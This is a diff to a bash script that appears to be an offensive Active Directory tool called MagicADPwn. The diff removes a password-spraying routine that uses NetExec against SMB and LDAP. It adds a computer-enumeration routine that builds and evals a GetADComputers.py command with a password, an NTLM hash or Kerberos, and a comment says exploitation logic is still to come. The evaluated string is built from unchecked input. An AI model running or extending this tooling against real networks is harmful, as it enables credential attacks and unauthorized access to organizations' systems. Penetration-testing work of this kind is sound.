@@ -41,36 +41,33 @@ check_port() {
   timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && return 0 || return 1
 }
 
-# Function for password spraying
-password_spray() {
+# Function to retrieve a list of computers from Active Directory
+enumerate_computers() {
   local target="$1"
-  local users="$2"
-  local passwords="$3"
+  local user="$2"
+  local pass="$3"
+  local hash="$4"
+  local kerberos="$5"
   
-  echo -e "${GREEN}[INFO]${RESET} Checking available authentication services on $target..."
+  echo -e "${GREEN}[INFO]${RESET} Enumerating computers on Active Directory..."
   
-  if check_port "$target" 445; then
-    echo -e "${GREEN}[INFO]${RESET} SMB (port 445) is open. Using SMB for authentication attempts."
-    if [[ -n "$users" && -n "$passwords" ]]; then
-      nxc smb "$target" -u "$users" -p "$passwords" | grep [+]
-    elif [[ -n "$users" ]]; then
-      nxc smb "$target" -u "$users" -p "$PASSWORD" | grep [+]
-    elif [[ -n "$passwords" ]]; then
-      nxc smb "$target" -u "$USERNAME" -p "$passwords" | grep [+]
-    fi
-  elif check_port "$target" 389; then
-    echo -e "${GREEN}[INFO]${RESET} LDAP (port 389) is open. Using LDAP for authentication attempts."
-    if [[ -n "$users" && -n "$passwords" ]]; then
-      nxc ldap "$target" -u "$users" -p "$passwords" | grep [+]
-    elif [[ -n "$users" ]]; then
-      nxc ldap "$target" -u "$users" -p "$PASSWORD" | grep [+]
-    elif [[ -n "$passwords" ]]; then
-      nxc ldap "$target" -u "$USERNAME" -p "$passwords" | grep [+]
-    fi
-  else
-    echo -e "${RED}[ERROR]${RESET} Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
-    return 1
+  local cmd="GetADComputers.py ${target}"
+  
+  if [[ -n "$user" ]]; then
+    cmd+="/${user}"
   fi
+  if [[ -n "$pass" ]]; then
+    cmd+=":${pass}"
+  fi
+  if [[ -n "$hash" ]]; then
+    cmd+=" -hashes $hash"
+  fi
+  if [[ "$kerberos" == "true" ]]; then
+    cmd+=" -k"
+  fi
+  
+  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  eval "$cmd"
 }
 
 # Ensure arguments are provided
@@ -159,13 +156,10 @@ if [[ -z "$TARGET" ]]; then
   exit 1
 fi
 
-# Determine authentication mode
-if [[ -n "$SPRAY_USERS" || -n "$SPRAY_PASSWORDS" ]]; then
-  password_spray "$TARGET" "$SPRAY_USERS" "$SPRAY_PASSWORDS"
-  exit 0
-fi
-
 # Placeholder for main execution logic
 echo "Starting MagicADPwn on $TARGET"
+
+# Enumerate computers from Active Directory
+enumerate_computers "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
 
 # Additional enumeration and exploitation logic will be added here
